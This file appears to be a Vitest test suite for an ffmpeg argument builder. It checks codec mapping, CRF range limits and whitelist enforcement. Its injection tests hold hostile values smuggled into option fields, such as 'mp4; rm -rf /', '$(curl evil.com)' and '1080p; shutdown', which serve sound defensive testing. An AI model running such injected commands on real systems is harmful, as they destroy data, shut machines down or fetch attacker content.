import { describe, it, expect } from 'vitest';
import { buildFfmpegArgs } from '../worker/src/ffmpeg/builder';
import type { ConversionOptions } from '../shared/src/index';

const VALID_OPTIONS: ConversionOptions = {
  outputFormat: 'mp4',
  videoCodec: 'libx264',
  audioCodec: 'aac',
  resolution: 'original',
  crf: 23,
};

describe('buildFfmpegArgs — whitelist enforcement', () => {
  it('builds a valid arg array for known-good options', () => {
    const { args } = buildFfmpegArgs('/input/file.mp4', '/output/out.mp4', VALID_OPTIONS);
    expect(args).toContain('-i');
    expect(args).toContain('/input/file.mp4');
    expect(args).toContain('-c:v');
    expect(args).toContain('libx264');
    expect(args).toContain('-c:a');
    expect(args).toContain('aac');
    expect(args).toContain('-crf');
    expect(args).toContain('23');
    expect(args).toContain('/output/out.mp4');
  });

  it('does NOT include -vf when resolution is "original"', () => {
    const { args } = buildFfmpegArgs('/input/file.mp4', '/output/out.mp4', VALID_OPTIONS);
    expect(args).not.toContain('-vf');
  });

  it('includes -vf scale filter when resolution is 720p', () => {
    const opts: ConversionOptions = { ...VALID_OPTIONS, resolution: '720p' };
    const { args } = buildFfmpegArgs('/input/file.mp4', '/output/out.mp4', opts);
    expect(args).toContain('-vf');
    expect(args).toContain('scale=-2:720');
  });

  it('maps vp9 to libvpx-vp9 codec flag', () => {
    const opts: ConversionOptions = {
      ...VALID_OPTIONS,
      outputFormat: 'webm',
      videoCodec: 'vp9',
      audioCodec: 'opus',
    };
    const { args } = buildFfmpegArgs('/input/file.webm', '/output/out.webm', opts);
    expect(args).toContain('libvpx-vp9');
    expect(args).toContain('libopus');
  });

  it('maps mp3 audio to libmp3lame codec flag', () => {
    const opts: ConversionOptions = { ...VALID_OPTIONS, audioCodec: 'mp3' };
    const { args } = buildFfmpegArgs('/input/file.mp4', '/output/out.mp4', opts);
    expect(args).toContain('libmp3lame');
  });

  // ── Command injection prevention ────────────────────────────────────────────

  it('throws on injected outputFormat', () => {
    const opts = { ...VALID_OPTIONS, outputFormat: 'mp4; rm -rf /' as any };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/not in whitelist/);
  });

  it('throws on injected videoCodec', () => {
    const opts = { ...VALID_OPTIONS, videoCodec: 'libx264 && malicious' as any };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/not in whitelist/);
  });

  it('throws on injected audioCodec', () => {
    const opts = { ...VALID_OPTIONS, audioCodec: '$(curl evil.com)' as any };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/not in whitelist/);
  });

  it('throws on injected resolution', () => {
    const opts = { ...VALID_OPTIONS, resolution: '1080p; shutdown' as any };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/not in whitelist/);
  });

  it('throws when CRF is below minimum (18)', () => {
    const opts = { ...VALID_OPTIONS, crf: 5 };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/out of range/);
  });

  it('throws when CRF is above maximum (51)', () => {
    const opts = { ...VALID_OPTIONS, crf: 99 };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/out of range/);
  });

  it('throws when CRF is NaN', () => {
    const opts = { ...VALID_OPTIONS, crf: NaN };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/out of range/);
  });

  it('throws when CRF is non-integer float', () => {
    const opts = { ...VALID_OPTIONS, crf: 23.5 };
    expect(() => buildFfmpegArgs('/in', '/out', opts)).toThrow(/out of range/);
  });

  it('returned args array never contains shell metacharacters from mapped values', () => {
    const { args } = buildFfmpegArgs('/input/file.mp4', '/output/out.mp4', VALID_OPTIONS);
    const dangerous = [';', '&&', '||', '`', '$', '>', '<', '|'];
    for (const arg of args) {
      for (const meta of dangerous) {
        // Only input/output paths could legitimately contain some chars —
        // the codec/format/resolution args must not.
        if (arg !== '/input/file.mp4' && arg !== '/output/out.mp4') {
          expect(arg).not.toContain(meta);
        }
      }
    }
  });
});
